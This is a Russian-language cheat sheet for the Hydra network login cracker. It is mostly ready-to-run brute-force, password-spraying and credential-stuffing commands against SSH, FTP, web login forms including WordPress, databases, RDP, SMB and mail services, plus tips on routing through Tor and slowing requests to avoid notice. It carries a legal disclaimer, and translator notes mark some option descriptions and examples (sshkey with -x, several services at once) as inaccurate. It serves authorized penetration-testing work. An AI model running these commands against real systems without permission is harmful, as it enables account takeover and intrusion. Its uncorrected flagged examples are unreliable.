<a id="-hydra---complete-cheatsheet"></a>
# 🔓 Hydra — полная шпаргалка

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../README.md) • [🇷🇺 Русский раздел](../../README.ru.md)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    The Fast Network Login Cracker
```

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Brute Force">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Network">
</p>

<p align="center">
  <b>🔑 Известный инструмент параллельного подбора паролей сетевых сервисов</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Введение](#-introduction)
- [Установка](#-installation)
- [Основной синтаксис](#-basic-syntax)
- [Поддерживаемые протоколы](#-supported-protocols)
- [Проверка SSH](#-ssh-attacks)
- [Проверка FTP](#-ftp-attacks)
- [Проверка HTTP-форм](#-http-form-attacks)
- [Проверка баз данных](#-database-attacks)
- [Проверка сервисов удалённого рабочего стола](#-remote-desktop-attacks)
- [Другие сервисы](#-other-services)
- [Словари и пароли](#-wordlists--passwords)
- [Дополнительные параметры](#-advanced-options)
- [Практические примеры](#-real-world-examples)
- [Краткий справочник](#-quick-reference)
- [Советы и рекомендуемые практики](#-tips--best-practices)
- [Полезные материалы](#-resources)

---

<a id="-introduction"></a>
## 🎯 Введение

> **Уточнения к оригиналу:** [официальное руководство Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.1) описывает -R как восстановление hydra.restore, а не сохранение нового сеанса; -w — ожидание ответа, а не паузу между попытками. -T задаёт общее число параллельных задач, а не тайм-аут; см. [справку из исходного кода](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c). -t ограничивает параллелизм, но не количество попыток и не гарантирует отсутствие блокировок. -V показывает проверяемые пары, а не версию программы. Параметры и доступные протоколы зависят от сборки. Исходные команды сохранены.

> **Примеры, требующие уточнения:** [модуль sshkey](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c) ожидает пути к незашифрованным закрытым ключам, поэтому строка с -x не является корректной демонстрацией проверки ключей. Синтаксис принимает один service; пример ssh ftp mysql не запускает три модуля одновременно. В наборе -x специальное значение имеют a, A и 1; ! обозначает сам символ, а не автоматически все специальные знаки. Форматы и условие HTTP-ответа должны соответствовать конкретной форме.

> **Подпись ASCII-эмблемы:** The Fast Network Login Cracker — быстрый инструмент подбора паролей сетевых сервисов. Рисунок сохранён.


**Hydra** (THC-Hydra) — быстрый и гибкий инструмент онлайн-подбора паролей, то есть проверки вариантов через сетевой сервис. Он поддерживает множество протоколов и параллельные соединения.

<a id="key-features"></a>
### Основные возможности

| Возможность | Описание |
| --------- | ------------- |
| **Более 50 протоколов** | SSH, FTP, HTTP, RDP, SMB и другие |
| **Параллельная работа** | Несколько одновременных соединений |
| **Гибкость** | Свои заголовки, cookie и прокси |
| **Возобновление** | Сохранение и восстановление сеансов проверки |
| **Поддержка разных платформ** | Linux, Windows, macOS |

<a id="attack-types"></a>
### Виды атак

| Тип | Описание |
| ------ | ------------- |
| **Словарная атака** | Проверка паролей из словаря |
| **Полный перебор** | Генерация всех комбинаций |
| **Password spraying** | Один пароль для нескольких пользователей |
| **Credential stuffing** | Пары имя пользователя:пароль |

---

<a id="-installation"></a>
## 📥 Установка

<a id="kali-linux-pre-installed"></a>
### Kali Linux (предустановлен)
```bash
hydra -h
```

<a id="ubuntudebian"></a>
### Ubuntu/Debian
```bash
sudo apt install hydra
```

<a id="from-source"></a>
### Из исходного кода
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

<a id="macos-homebrew"></a>
### macOS (Homebrew)
```bash
brew install hydra
```

<a id="verify-installation"></a>
### Проверка установки
```bash
hydra -h
hydra -V
```

---

<a id="-basic-syntax"></a>
## ⌨️ Основной синтаксис

<a id="general-syntax"></a>
### Общий синтаксис
```bash
hydra [options] target service
```

<a id="common-options"></a>
### Часто используемые параметры

| Параметр | Описание |
| -------- | ------------- |
| `-l` | Одно имя пользователя |
| `-L` | Список имён пользователей |
| `-p` | Один пароль |
| `-P` | Список паролей |
| `-C` | Файл с разделителем-двоеточием (user:pass) |
| `-t` | Параллельные задачи (по умолчанию: 16) |
| `-s` | Номер порта |
| `-o` | Файл вывода |
| `-f` | Остановка при первой подходящей паре |
| `-V` | Подробный режим |
| `-vV` | Очень подробный вывод |
| `-d` | Режим отладки |

<a id="quick-start"></a>
### Быстрый старт
```bash
# Один пользователь и список паролей
hydra -l admin -P passwords.txt target ssh

# Список пользователей и один пароль
hydra -L users.txt -p password123 target ssh

# Оба списка
hydra -L users.txt -P passwords.txt target ssh
```

---

<a id="-supported-protocols"></a>
## 📡 Поддерживаемые протоколы

<a id="complete-protocol-list"></a>
### Полный список протоколов

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

<a id="-ssh-attacks"></a>
## 🔐 Проверка SSH

<a id="basic-ssh-attack"></a>
### Базовый подбор пароля SSH
```bash
# Один пользователь
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Несколько пользователей
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# Определённый порт
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

<a id="ssh-with-options"></a>
### SSH с дополнительными параметрами
```bash
# Ограничить параллелизм (подпись оригинала о попытках требует уточнения)
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# Остановиться при первом успехе
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# Подробный вывод
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

<a id="ssh-key-authentication"></a>
### Аутентификация SSH по ключу
```bash
# С закрытым ключом (пример оригинала требует уточнения)
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

<a id="-ftp-attacks"></a>
## 📂 Проверка FTP

<a id="basic-ftp-attack"></a>
### Базовый подбор пароля FTP
```bash
# Подбор пароля FTP
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Проверка анонимного FTP
hydra -l anonymous -p anonymous ftp://192.168.1.1

# Несколько пользователей
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

<a id="ftps-ftp-over-ssl"></a>
### FTPS (FTP поверх SSL)
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

<a id="-http-form-attacks"></a>
## 🌐 Проверка HTTP-форм

<a id="http-get-form"></a>
### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# Формат:
# "/path:params:failure_string"
```

<a id="http-post-form-most-common"></a>
### HTTP-POST-FORM (наиболее частый вариант)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

<a id="form-attack-syntax"></a>
### Синтаксис проверки формы

```
"/page:POST_params:Failure_string"

Где:
- ^USER^ = заполнитель имени пользователя
- ^PASS^ = заполнитель пароля
- Failure_string = текст ответа при неудачном входе
```

<a id="success-based-detection"></a>
### Определение успеха по ответу

```bash
# Использовать S= для строки успеха вместо признака неудачи
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

<a id="with-cookies"></a>
### С файлами cookie

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

<a id="http-basic-auth"></a>
### HTTP Basic Auth

```bash
# HTTP Basic Authentication
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

<a id="http-proxy"></a>
### HTTP-прокси

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a id="-database-attacks"></a>
## 🗄️ Проверка баз данных

<a id="mysql"></a>
### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# Определённый порт
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

<a id="postgresql"></a>
### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

<a id="microsoft-sql-server"></a>
### Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

<a id="oracle"></a>
### Oracle

```bash
# Проверка Oracle SID
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# Oracle listener
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

<a id="mongodb"></a>
### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

<a id="redis"></a>
### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a id="-remote-desktop-attacks"></a>
## 🖥️ Проверка сервисов удалённого рабочего стола

<a id="rdp-windows-remote-desktop"></a>
### RDP (удалённый рабочий стол Windows)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# Ограничить параллелизм (RDP работает медленно)
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

<a id="vnc"></a>
### VNC

```bash
# VNC (только пароль)
hydra -P passwords.txt vnc://192.168.1.1

# Другой порт VNC (подпись версии в оригинале неточна)
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

<a id="telnet"></a>
### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

<a id="-other-services"></a>
## 🔧 Другие сервисы

<a id="smb-windows-shares"></a>
### SMB (общие ресурсы Windows)

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

<a id="smtp"></a>
### SMTP

```bash
# Аутентификация SMTP
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# Перечисление пользователей SMTP
hydra -L users.txt smtp-enum://192.168.1.1
```

<a id="pop3imap"></a>
### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

<a id="ldap"></a>
### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

<a id="snmp"></a>
### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

<a id="-wordlists--passwords"></a>
## 📚 Словари и пароли

<a id="popular-wordlists"></a>
### Популярные словари

```bash
# Расположение словарей Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# Пароли SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

<a id="password-generation--x"></a>
### Генерация паролей (-x)

```bash
# Генерация паролей: min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # 4-6 строчных букв
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # 4-6 прописных букв
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # 4-6 цифр
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # Смешанный набор

# Обозначения набора символов:
# a = строчные буквы    A = прописные буквы
# 1 = цифры      ! = специальные символы (подпись оригинала; см. уточнение)
```

<a id="colon-separated-file--c"></a>
### Файл с разделителем-двоеточием (-C)

```bash
# Формат user:password
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

<a id="usernamepassword-customization"></a>
### Дополнительные проверки имён и паролей

```bash
# Пустые пароли
hydra -l admin -e n 192.168.1.1 ssh

# Попробовать имя пользователя как пароль
hydra -l admin -e s 192.168.1.1 ssh

# Попробовать перевёрнутое имя пользователя как пароль
hydra -l admin -e r 192.168.1.1 ssh

# Все дополнительные проверки
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

<a id="-advanced-options"></a>
## ⚡ Дополнительные параметры

<a id="output--logging"></a>
### Вывод и журналирование

```bash
# Сохранить результаты в файл
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# Вывод JSON
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

<a id="resume-attacks"></a>
### Возобновление прерванной проверки

```bash
# Сохранение сеанса для продолжения (подпись оригинала; см. уточнение)
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# Возобновить прерванную проверку
hydra -R
```

<a id="proxy-support"></a>
### Поддержка прокси

```bash
# HTTP-прокси
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# SOCKS-прокси
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

<a id="performance-tuning"></a>
### Настройка производительности

```bash
# Параллельные задачи (по умолчанию: 16)
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# Ожидание между попытками (подпись оригинала; см. уточнение)
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# Тайм-аут соединения (подпись оригинала; см. уточнение)
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

<a id="multiple-targets"></a>
### Несколько целей

```bash
# Из файла
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

<a id="-real-world-examples"></a>
## 🎬 Практические примеры

<a id="example-1-ssh-brute-force"></a>
### Пример 1: подбор пароля SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

<a id="example-2-web-login-form"></a>
### Пример 2: веб-форма входа
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

<a id="example-3-wordpress-login"></a>
### Пример 3: вход WordPress
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

<a id="example-4-multiple-services"></a>
### Пример 4: несколько сервисов
```bash
# Несколько сервисов на одном узле (пример оригинала требует уточнения)
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

<a id="example-5-password-spray"></a>
### Пример 5: password spraying
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

<a id="example-6-with-proxytor"></a>
### Пример 6: через прокси или Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

<a id="example-7-http-basic-auth-admin-panel"></a>
### Пример 7: HTTP Basic Auth (панель администратора)
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

<a id="example-8-rdp-attack-careful"></a>
### Пример 8: проверка RDP (осторожно!)
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="essential-commands"></a>
### Основные команды

| Задача | Команда |
| ------ | --------- |
| Проверка SSH | `hydra -l user -P pass.txt ssh://target` |
| Проверка FTP | `hydra -l user -P pass.txt ftp://target` |
| HTTP POST-форма | `hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"` |
| Проверка RDP | `hydra -l user -P pass.txt rdp://target` |
| Сохранение вывода | `hydra ... -o results.txt` |
| Возобновление проверки | `hydra -R` |

<a id="common-options-1"></a>
### Часто используемые параметры

| Параметр | Описание |
| -------- | ------------- |
| `-l/-L` | Имя пользователя / список |
| `-p/-P` | Пароль / список |
| `-C` | Файл user:pass |
| `-t` | Параллельные задачи |
| `-s` | Порт |
| `-f` | Остановка при успехе |
| `-V` | Подробный вывод |
| `-o` | Файл вывода |
| `-x` | Генерация паролей |
| `-e nsr` | Пустой пароль, имя пользователя и перевёрнутое имя |

---

<a id="-tips--best-practices"></a>
## 💡 Советы и рекомендуемые практики

<a id="performance-tips"></a>
### Советы по производительности

1. **Ограничивайте параллелизм для чувствительных сервисов**
   ```bash
   # RDP, SMB — мало параллельных задач
   hydra -t 1 ...
   
   # SSH — умеренный параллелизм
   hydra -t 4 ...
   
   # Веб-формы — параллелизм может быть выше
   hydra -t 16 ...
   ```

2. **Используйте подходящие для цели словари**
   ```bash
   # Подходящими вариантами вместо rockyou.txt могут быть:
   # - 1000 популярных паролей
   # - Стандартные учётные данные
   # - Словарь, связанный с организацией
   ```

3. **Сначала проверяйте политику блокировки**
   ```bash
   # Сначала проверить на небольшом словаре
   hydra -l admin -P small.txt -t 1 target ssh
   ```

<a id="stealth-tips"></a>
### Снижение интенсивности запросов

```bash
# Добавить задержки (подпись оригинала; см. уточнение -w)
hydra -l admin -P passwords.txt -w 30 target ssh

# Низкий параллелизм
hydra -l admin -P passwords.txt -t 2 target ssh

# Через прокси
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Правовая оговорка

> **ПРЕДУПРЕЖДЕНИЕ:** Hydra — мощный инструмент, который следует использовать только **для разрешённого тестирования**.
> 
> - ✅ Проверяйте собственные системы
> - ✅ Получайте явное письменное разрешение
> - ✅ Используйте в согласованном тестировании на проникновение
> - ❌ Не проводите атаки без разрешения
> - ❌ Подбор паролей без разрешения незаконен
> 
> **Попытки несанкционированного доступа незаконны и могут повлечь уголовную ответственность.**

---

<a id="-resources"></a>
## 📚 Полезные материалы

<a id="official-resources"></a>
### Официальные материалы
- [THC-Hydra на GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Руководство Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)

<a id="wordlists"></a>
### Словари
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Стандартные учётные данные](https://github.com/ihebski/DefaultCreds-cheat-sheet)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Nmap](../../Nmap/translations/README.ru.md)
- [Metasploit](../../Metasploit/translations/README.ru.md)
- [SQLMap](../../SQLMap/translations/README.ru.md)

---

<p align="center">
  <b>🔓 Освойте проверку паролей сетевых сервисов!</b><br>
  <i>Всегда сначала получайте разрешение</i>
</p>
